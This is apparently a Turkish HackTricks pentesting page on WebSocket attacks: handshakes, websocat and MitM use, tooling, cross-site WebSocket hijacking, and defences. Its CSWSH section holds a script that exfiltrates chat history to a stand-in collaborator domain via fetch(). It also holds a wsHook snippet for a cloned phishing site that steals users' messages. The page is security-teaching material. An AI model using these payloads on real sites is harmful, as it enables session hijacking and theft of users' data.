# WebSocket Saldırıları

{{#include ../banners/hacktricks-training.md}}

## WebSocket Nedir

WebSocket bağlantıları, başlangıçta bir **HTTP** el sıkışması ile kurulur ve **uzun ömürlü** olacak şekilde tasarlanmıştır; bu, herhangi bir zamanda iki yönlü mesajlaşmaya olanak tanır ve bir işlem sistemine ihtiyaç duymaz. Bu, WebSocket'leri, **düşük gecikme veya sunucu tarafından başlatılan iletişim** gerektiren uygulamalar için özellikle avantajlı hale getirir, örneğin canlı finansal veri akışları.

### WebSocket Bağlantılarının Kurulması

WebSocket bağlantılarının kurulması hakkında ayrıntılı bir açıklama [**buradan**](https://infosecwriteups.com/cross-site-websocket-hijacking-cswsh-ce2a6b0747fc) erişilebilir. Özetle, WebSocket bağlantıları genellikle aşağıda gösterildiği gibi istemci tarafı JavaScript ile başlatılır:
```javascript
var ws = new WebSocket("wss://normal-website.com/ws")
```
`wss` protokolü, **TLS** ile güvenli bir WebSocket bağlantısını belirtirken, `ws` **güvensiz** bir bağlantıyı gösterir.

Bağlantı kurulumu sırasında, tarayıcı ve sunucu arasında HTTP üzerinden bir el sıkışma (handshake) gerçekleştirilir. El sıkışma süreci, tarayıcının bir istek göndermesi ve sunucunun yanıt vermesi ile ilgilidir; aşağıdaki örneklerde gösterildiği gibi:

Tarayıcı bir el sıkışma isteği gönderir:
```javascript
GET /chat HTTP/1.1
Host: normal-website.com
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==
Connection: keep-alive, Upgrade
Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2
Upgrade: websocket
```
Sunucu el sıkışma yanıtı:
```javascript
HTTP/1.1 101 Switching Protocols
Connection: Upgrade
Upgrade: websocket
Sec-WebSocket-Accept: 0FFP+2nmNIf/h+4BP36k9uzrYGk=
```
Bağlantı kurulduktan sonra, her iki yönde mesaj alışverişi için açık kalır.

**WebSocket El Sıkışma Anahtar Noktaları:**

- `Connection` ve `Upgrade` başlıkları, bir WebSocket el sıkışmasının başlatıldığını belirtir.
- `Sec-WebSocket-Version` başlığı, genellikle `13` olan istenen WebSocket protokol sürümünü gösterir.
- `Sec-WebSocket-Key` başlığında, her el sıkışmanın benzersiz olmasını sağlamak için Base64 kodlu rastgele bir değer gönderilir; bu, önbellek proxy'leriyle ilgili sorunları önlemeye yardımcı olur. Bu değer kimlik doğrulama için değil, yanıtın yanlış yapılandırılmış bir sunucu veya önbellek tarafından üretilmediğini doğrulamak içindir.
- Sunucunun yanıtındaki `Sec-WebSocket-Accept` başlığı, `Sec-WebSocket-Key`'in bir hash'idir ve sunucunun bir WebSocket bağlantısı açma niyetini doğrular.

Bu özellikler, el sıkışma sürecinin güvenli ve güvenilir olmasını sağlar ve verimli gerçek zamanlı iletişim için zemin hazırlar.

### Linux konsolu

Bir websocket ile ham bir bağlantı kurmak için `websocat` kullanabilirsiniz.
```bash
websocat --insecure wss://10.10.10.10:8000 -v
```
Veya bir websocat sunucusu oluşturmak için:
```bash
websocat -s 0.0.0.0:8000 #Listen in port 8000
```
### MitM websocket bağlantıları

Eğer istemcilerin mevcut yerel ağınızdan bir **HTTP websocket**'e bağlı olduğunu bulursanız, istemci ile sunucu arasında bir MitM saldırısı gerçekleştirmek için bir [ARP Spoofing Attack ](../generic-methodologies-and-resources/pentesting-network/index.html#arp-spoofing) denemek isteyebilirsiniz.\
İstemci sizinle bağlantı kurmaya çalıştığında, o zaman şunu kullanabilirsiniz:
```bash
websocat -E --insecure --text ws-listen:0.0.0.0:8000 wss://10.10.10.10:8000 -v
```
### Websockets enumeration

Websockets'ı otomatik olarak keşfetmek, parmak izi çıkarmak ve bilinen **vulnerabilities** için arama yapmak üzere **tool** [**https://github.com/PalindromeLabs/STEWS**](https://github.com/PalindromeLabs/STEWS) **kullanabilirsiniz.**

### Websocket Debug tools

- **Burp Suite**, MitM websockets iletişimini, normal HTTP iletişimi için yaptığına çok benzer bir şekilde destekler.
- [**socketsleuth**](https://github.com/snyk/socketsleuth) **Burp Suite uzantısı**, **history** alarak, **interception rules** ayarlayarak, **match and replace** kurallarını kullanarak, **Intruder** ve **AutoRepeater** kullanarak Burp'taki Websocket iletişimlerini daha iyi yönetmenizi sağlar.
- [**WSSiP**](https://github.com/nccgroup/wssip)**:** "WebSocket/Socket.io Proxy"nun kısaltması olan bu araç, Node.js ile yazılmıştır ve istemci ile sunucu arasındaki tüm WebSocket ve Socket.IO iletişimlerini **yakalamak, kesmek, özel** mesajlar göndermek ve görüntülemek için bir kullanıcı arayüzü sağlar.
- [**wsrepl**](https://github.com/doyensec/wsrepl), özellikle penetrasyon testi için tasarlanmış bir **interaktif websocket REPL**'dir. **Gelen websocket mesajlarını gözlemlemek ve yenilerini göndermek** için bir arayüz sağlar ve bu iletişimi **otomatikleştirmek** için kullanımı kolay bir çerçeve sunar.
- [**https://websocketking.com/**](https://websocketking.com/) diğer weblerle **websockets** kullanarak iletişim kurmak için bir **web**'dir.
- [**https://hoppscotch.io/realtime/websocket**](https://hoppscotch.io/realtime/websocket) diğer iletişim/protokol türlerinin yanı sıra, diğer weblerle **websockets** kullanarak iletişim kurmak için bir **web** sağlar.

## Decrypting Websocket

- [https://github.com/Anof-cyber/PyCript](https://github.com/Anof-cyber/PyCript)
- [https://github.com/Anof-cyber/PyCript-WebSocket/](https://github.com/Anof-cyber/PyCript-WebSocket/)

## Websocket Lab

[**Burp-Suite-Extender-Montoya-Course**](https://github.com/federicodotta/Burp-Suite-Extender-Montoya-Course) içinde websockets kullanarak bir web başlatmak için bir kod bulabilirsiniz ve [**bu yazıda**](https://security.humanativaspa.it/extending-burp-suite-for-fun-and-profit-the-montoya-way-part-3/) bir açıklama bulabilirsiniz.

## Websocket Fuzzing

Burp uzantısı [**Backslash Powered Scanner**](https://github.com/PortSwigger/backslash-powered-scanner) artık WebSocket mesajlarını da fuzz yapmanıza olanak tanıyor. Bununla ilgili daha fazla bilgi [**burada**](https://arete06.com/posts/fuzzing-ws/#adding-websocket-support-to-backslash-powered-scanner) okuyabilirsiniz.

## Cross-site WebSocket hijacking (CSWSH)

**Cross-site WebSocket hijacking**, ayrıca **cross-origin WebSocket hijacking** olarak da bilinir, WebSocket el sıkışmalarını etkileyen **[Cross-Site Request Forgery (CSRF)](csrf-cross-site-request-forgery.md)**'nin özel bir durumu olarak tanımlanır. Bu güvenlik açığı, WebSocket el sıkışmalarının yalnızca **HTTP cookies** aracılığıyla kimlik doğrulaması yaptığı durumlarda ortaya çıkar; **CSRF token** veya benzeri güvenlik önlemleri olmadan.

Saldırganlar, savunmasız bir uygulamaya çapraz site WebSocket bağlantısı başlatan bir **kötü niyetli web sayfası** barındırarak bunu istismar edebilir. Sonuç olarak, bu bağlantı, uygulama ile kurbanın oturumu ile bir parça olarak kabul edilir ve oturum yönetim mekanizmasındaki CSRF korumasının eksikliğinden yararlanır.

Bu saldırının çalışabilmesi için gereksinimler şunlardır:

- Websocket **kimlik doğrulaması çerez tabanlı olmalıdır**
- Çerez, saldırganın sunucusundan erişilebilir olmalıdır (bu genellikle **`SameSite=None`** anlamına gelir) ve Firefox'ta **Firefox Total Cookie Protection** etkin olmamalı ve Chrome'da **üçüncü taraf çerezleri** engellenmemelidir.
- Websocket sunucusu bağlantının kaynağını kontrol etmemelidir (veya bu aşılabilir olmalıdır)

Ayrıca:

- Kimlik doğrulama yerel bir bağlantıya (localhost veya yerel ağa) dayanıyorsa, saldırı **mümkün olacaktır** çünkü mevcut korumalar bunu yasaklamaz (daha fazla bilgi için [buraya](https://blog.includesecurity.com/2025/04/cross-site-websocket-hijacking-exploitation-in-2025/) bakın)

### Simple Attack

**websocket** bağlantısı **kurulduğunda** **çerez** sunucuya **gönderilir**. **Sunucu**, her **belirli** **kullanıcıyı** gönderilen çerez temelinde **websocket** **oturumu** ile **ilişkilendirmek** için bunu kullanıyor olabilir.

Daha sonra, eğer **örneğin** **websocket** **sunucusu**, bir mesaj "**READY"** gönderildiğinde bir kullanıcının konuşma geçmişini **geri gönderirse**, o zaman bağlantıyı kuran **basit bir XSS** (çerez **otomatik olarak** kurban kullanıcının yetkilendirilmesi için **gönderilecektir**) "**READY**" göndererek **konuşma** geçmişini **geri alabilecektir**.
```html
<script>
websocket = new WebSocket('wss://your-websocket-URL')
websocket.onopen = start
websocket.onmessage = handleReply
function start(event) {
websocket.send("READY"); //Send the message to retreive confidential information
}
function handleReply(event) {
//Exfiltrate the confidential information to attackers server
fetch('https://your-collaborator-domain/?'+event.data, {mode: 'no-cors'})
}
</script>
```
### Cross Origin + Cookie with a different subdomain

Bu blog yazısında [https://snyk.io/blog/gitpod-remote-code-execution-vulnerability-websockets/](https://snyk.io/blog/gitpod-remote-code-execution-vulnerability-websockets/) saldırgan, web socket iletişiminin gerçekleştiği alanın **alt alanında rastgele Javascript çalıştırmayı** başardı. Çünkü bu bir **alt alan** idi, **çerez** **gönderiliyordu** ve çünkü **Websocket, Origin'i düzgün kontrol etmediği için**, onunla iletişim kurmak ve **ondan token çalmak** mümkün oldu.

### Stealing data from user

Kendinizi taklit etmek istediğiniz web uygulamasını kopyalayın (örneğin .html dosyaları) ve websocket iletişiminin gerçekleştiği scriptin içine bu kodu ekleyin:
```javascript
//This is the script tag to load the websocket hooker
;<script src="wsHook.js"></script>

//These are the functions that are gonig to be executed before a message
//is sent by the client or received from the server
//These code must be between some <script> tags or inside a .js file
wsHook.before = function (data, url) {
var xhttp = new XMLHttpRequest()
xhttp.open("GET", "client_msg?m=" + data, true)
xhttp.send()
}
wsHook.after = function (messageEvent, url, wsObject) {
var xhttp = new XMLHttpRequest()
xhttp.open("GET", "server_msg?m=" + messageEvent.data, true)
xhttp.send()
return messageEvent
}
```
Şimdi `wsHook.js` dosyasını [https://github.com/skepticfx/wshook](https://github.com/skepticfx/wshook) adresinden indirin ve **web dosyalarının bulunduğu klasöre kaydedin**.\
Web uygulamasını açarak bir kullanıcının buna bağlanmasını sağlarsanız, websocket üzerinden gönderilen ve alınan mesajları çalabilirsiniz:
```javascript
sudo python3 -m http.server 80
```
### CSWSH Koruma Yöntemleri

CSWSH saldırısı, bir **kullanıcının kötü niyetli bir sayfaya bağlanacağı** ve bu sayfanın **kullanıcının zaten bağlı olduğu bir web sayfasına websocket bağlantısı açacağı** gerçeğine dayanmaktadır; bu istek kullanıcının çerezlerini göndereceği için kullanıcı olarak kimlik doğrulaması yapılacaktır.

Günümüzde bu sorunu önlemek oldukça kolaydır:

- **Websocket sunucusunun kaynağı kontrol etmesi**: Websocket sunucusu, beklenmedik sayfaların bağlanmasını önlemek için her zaman kullanıcının nereden bağlandığını kontrol etmelidir.
- **Kimlik doğrulama token'ı**: Kimlik doğrulamasını bir çereze dayandırmak yerine, websocket bağlantısı, saldırgana bilinmeyen bir kullanıcı için sunucu tarafından üretilen bir token'a dayandırılabilir (bir anti-CSRF token'ı gibi).
- **SameSite Cookie özelliği**: `SameSite` değeri `Lax` veya `Strict` olan çerezler, dışarıdan bir saldırgan sayfasından kurban sunucusuna gönderilmeyecek, bu nedenle çerez tabanlı kimlik doğrulama başarılı olmayacaktır. Chrome'un artık bu bayrak belirtilmeden çerezlere **`Lax`** değerini verdiğini ve bu durumun varsayılan olarak daha güvenli hale geldiğini unutmayın. Ancak, bir çerez oluşturulduğunda ilk 2 dakika boyunca değeri **`None`** olacak ve bu sınırlı süre boyunca savunmasız olacaktır (bu önlemin bir noktada kaldırılması beklenmektedir).
- **Firefox Tam Çerez Koruması**: Tam Çerez Koruması, çerezleri oluşturuldukları siteye izole ederek çalışır. Temelde her site, üçüncü tarafların bir kullanıcının tarayıcı geçmişini birleştirmesini önlemek için kendi çerez depolama bölümüne sahiptir. Bu, **CSWSH'yi kullanılamaz hale getirir** çünkü saldırganın sitesi çerezlere erişim sağlayamaz.
- **Chrome üçüncü taraf çerez engeli**: Bu, `SameSite=None` ile bile olsa, kimlik doğrulaması yapılmış kullanıcının çerezinin websocket sunucusuna gönderilmesini de engelleyebilir.

## Yarış Koşulları

WebSocket'lerde Yarış Koşulları da bir durumdur, [daha fazla bilgi için bu bilgiyi kontrol edin](race-condition.md#rc-in-websockets).

## Diğer zafiyetler

Web Sockets, **veri göndermek için sunucu tarafı ve istemci tarafı** arasında bir mekanizma olduğundan, sunucu ve istemcinin bilgileri nasıl işlediğine bağlı olarak, **Web Sockets, bir websocket üzerinden bir kullanıcının girişi ile XSS, SQLi veya diğer yaygın web zafiyetlerini istismar etmek için kullanılabilir.**

## **WebSocket Kaçırma**

Bu zafiyet, **ters proxy kısıtlamalarını aşmanıza** olanak tanıyabilir ve onlara **websocket iletişiminin kurulduğunu** düşündürebilir (gerçek olmasa bile). Bu, bir saldırganın **gizli uç noktalara erişmesine** izin verebilir. Daha fazla bilgi için aşağıdaki sayfayı kontrol edin:

{{#ref}}
h2c-smuggling.md
{{#endref}}

## Referanslar

- [https://portswigger.net/web-security/websockets#intercepting-and-modifying-websocket-messages](https://portswigger.net/web-security/websockets#intercepting-and-modifying-websocket-messages)
- [https://blog.includesecurity.com/2025/04/cross-site-websocket-hijacking-exploitation-in-2025/](https://blog.includesecurity.com/2025/04/cross-site-websocket-hijacking-exploitation-in-2025/)

{{#include ../banners/hacktricks-training.md}}
